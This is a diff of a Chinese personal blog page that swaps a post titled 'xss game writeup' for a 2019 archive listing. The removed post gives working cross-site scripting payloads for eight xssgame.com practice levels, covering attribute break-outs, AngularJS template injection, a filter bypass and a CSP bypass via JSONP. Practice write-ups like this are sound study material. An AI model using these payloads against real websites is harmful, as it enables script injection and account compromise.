@@ -96,18 +96,14 @@
 
 
 
-  <meta name="description" content="地址">
-<meta name="keywords" content="security">
-<meta property="og:type" content="article">
-<meta property="og:title" content="xss game writeup">
-<meta property="og:url" content="http://j1nse.top/2019/04/06/xss-game/index.html">
+  <meta name="keywords" content="security">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cgtx&#39;s blog">
+<meta property="og:url" content="http://j1nse.top/archives/2019/page/2/index.html">
 <meta property="og:site_name" content="cgtx&#39;s blog">
-<meta property="og:description" content="地址">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-04-06T15:05:56.647Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xss game writeup">
-<meta name="twitter:description" content="地址">
+<meta name="twitter:title" content="cgtx&#39;s blog">
 
 
 
@@ -115,7 +111,7 @@
 
   
   
-  <link rel="canonical" href="http://j1nse.top/2019/04/06/xss-game/">
+  <link rel="canonical" href="http://j1nse.top/archives/2019/page/2/">
 
 
 
@@ -125,7 +121,7 @@
   };
 </script>
 
-  <title>xss game writeup | cgtx's blog</title>
+  <title>归档 | cgtx's blog</title>
   
 
 
@@ -173,7 +169,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left page-archive">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -262,7 +258,7 @@
         
         
           
-          <li class="menu-item menu-item-archives">
+          <li class="menu-item menu-item-archives menu-item-active">
 
     
     
@@ -304,209 +300,105 @@
           
             
 
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
           
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block archive">
+    <div id="posts" class="posts-collapse">
+      <span class="archive-move-on"></span>
 
-  
+      
+      <span class="archive-page-counter">
+        
+        
+        
+          
+        
+        嗯..! 目前共计 11 篇日志。 继续努力。
+      </span>
+      
 
-  
-  
-  
+      
 
-  
+        
+        
+        
+
+        
+          
+          <div class="collection-title">
+            <h2 class="archive-year" id="archive-year-2019">2019</h2>
+          </div>
+        
+        
+
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://j1nse.top/2019/04/06/xss-game/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cgtx">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/me.webp">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="cgtx's blog">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h3 class="post-title">
         
+          <a class="post-title-link" href="/2019/03/29/hello-world/" itemprop="url">
+            
+              <span itemprop="name">cgtx's blog reborn</span>
+            
+          </a>
         
-          <h2 class="post-title" itemprop="name headline">xss game writeup
+      </h3>
 
-              
-            
-          </h2>
-        
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated" datetime="2019-03-29T13:29:04+08:00" content="2019-03-29">
+          03-29
+        </time>
+      </div>
 
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-04-06 10:00:00 / 修改时间：23:05:56" itemprop="dateCreated datePublished" datetime="2019-04-06T10:00:00+08:00">2019-04-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p><a href="http://www.xssgame.com" target="_blank" rel="noopener">地址</a><br><a id="more"></a></p>
-<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="http://www.xssgame.com/f/m4KKGHi2rVUN/?query=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=%3Cscript%3Ealert(1)%3C/script%3E</a><br><code>&lt;b&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/b&gt;</code></p>
-<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>输入会插入到<code>onload=&quot;startTimer(&#39;input&#39;);&quot; /&gt;</code>这里</p>
-<p>用<code>&#39;);alert(&#39;1</code></p>
-<p><code>&lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%; display: none;&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p>
-<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><code>1&#39;onerror=alert(1);&#39;</code></p>
-<p>结果:<br><code>&lt;img src=&quot;/static/img/cat1&quot; onerror=&quot;alert(1);&#39;.jpg&#39;&quot;&gt;</code></p>
-<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><code>http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(1)</code></p>
-<p>next的值会加到next前面作为跳转链接<code>http://www.xssgame.com/f/__58a1wgqGgI/abc?next=welcome</code><br>然后跳转链接里next的值会输出到页面</p>
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>看了一下js，大概意思就是url里的查询部分的值会插到对应input标签里的值。在搜索框里有<code>ng-non-bindable</code>属性，没法触发解析漏洞，所以就用input标签的值来触发</p>
-<p><code>http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{$eval(%27alert(1)%27)}}</code></p>
-<p>这里的alert()已经被替换成<code>window.alert</code>了</p>
-<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>url里过滤了<code>{</code><br>所以用html实体编码再url编码一下<code>{</code><br>payload:`%26%23123%3B%26%23123%3B%0A$eval(%27alert(1)%27);}}</p>
-<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>绕过CSP，用jsonp的callback名字来绕<br><code>&lt;script src=&quot;jsonp?callback=alert(1)&quot;&gt;&lt;/script&gt;</code></p>
-<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>先用<code>?set</code>设置csrf_token，然后再redirect到transfer,用<code>?transfer</code>来输出payload，带上设置的csrf_token<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=123&amp;redirect=transfer?amount=%3Cscript%3Ealert(1)%3C%2Fscript%3E%26csrf_token=123</code><br>注意redirect的<code>&amp;</code>要编码一下，否则会被解析成set的参数</p>
-<p><strong>Congratulations, you have solved all the challenges!</strong></p>
-
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/04/03/collectMessage/" rel="next" title="信息收集">
-                <i class="fa fa-chevron-left"></i> 信息收集
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/07/linux运维安全相关/" rel="prev" title="linux运维安全相关">
-                linux运维安全相关 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
+
+      
+
+    </div>
   </div>
+  
+  
+  
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/archives/2019/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/archives/2019/">1</a><span class="page-number current">2</span>
+  </nav>
+
+
 
 
           </div>
           
-
-  
-
-
 
         </div>
         
@@ -526,17 +418,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <div class="site-overview-wrap sidebar-panel">
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -603,23 +486,6 @@
         </div>
       </div>
 
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">5.</span> <span class="nav-text">5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6"><span class="nav-number">6.</span> <span class="nav-text">6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7"><span class="nav-number">7.</span> <span class="nav-text">7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8"><span class="nav-number">8.</span> <span class="nav-text">8</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
       
 
       
@@ -755,10 +621,6 @@
 
 
   
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
 
   
 
@@ -774,8 +636,6 @@
 
   
 
-
-  
 
 
   
